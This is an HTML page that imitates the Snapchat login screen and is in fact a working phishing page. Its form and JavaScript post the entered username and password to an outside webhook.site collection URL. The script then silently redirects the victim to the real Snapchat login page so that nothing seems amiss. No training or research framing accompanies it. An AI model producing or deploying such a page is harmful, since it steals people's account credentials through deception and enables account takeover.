<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Login</title>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #FFFC00; text-align: center; margin: 0; padding-top: 50px; }
        .login-box { background: white; padding: 40px 20px; border-radius: 10px; display: inline-block; width: 320px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .logo { width: 60px; margin-bottom: 20px; }
        h2 { font-size: 20px; margin-bottom: 20px; color: #333; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #e0e0e0; border-radius: 5px; background-color: #f8f8f8; font-size: 14px; }
        button { background-color: #000; color: white; border: none; padding: 12px; border-radius: 25px; cursor: pointer; width: 95%; font-weight: bold; font-size: 16px; margin-top: 10px; }
        .footer-text { margin-top: 20px; font-size: 12px; color: #777; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" alt="Snapchat" class="logo">
        <h2>Log In</h2>
        <form id="loginForm" action="https://webhook.site/11a83c79-6c7a-466b-a15e-2e3024374a9f" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer-text">
            <p>New to Snapchat? <strong>Sign Up</strong></p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = e.target;
            const formData = new FormData(form);

            fetch(form.action, {
                method: 'POST',
                body: formData,
                mode: 'no-cors'
            }).then(() => {
                setTimeout(() => {
                    window.location.href = "https://accounts.snapchat.com/accounts/login";
                }, 1000);
            }).catch(() => {
                window.location.href = "https://accounts.snapchat.com/accounts/login";
            });
        });
    </script>
</body>
</html>
